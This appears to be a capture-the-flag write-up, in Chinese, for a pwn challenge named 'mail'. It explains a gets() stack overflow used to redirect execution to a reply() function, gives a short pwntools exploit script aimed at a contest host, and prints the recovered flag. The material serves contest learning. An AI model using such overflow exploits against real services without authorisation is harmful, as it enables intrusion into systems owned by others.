## mail
### solution
分析以後發現main會呼叫兩次`gets()`，可以進行覆蓋到return address，而有個函式`reply()`似乎會讀檔並輸出內容，因此試著控制RIP跳到`reply()`即能拿到flag。
### script
```python
#!/usr/bin/env python3
from pwn import *
context(arch="amd64")

r = remote("104.199.235.135", 2111)
b = ELF("mail")
r.sendline(b"a" * 40 + p64(b.symbols[b'reply']))
r.sendline("a")
r.interactive()
```
### flag
```
AIS3{3hY_d0_yOU_Kn0uu_tH3_r3p1Y?!_I_d0nt_3ant_t0_giu3_QwQ}
```
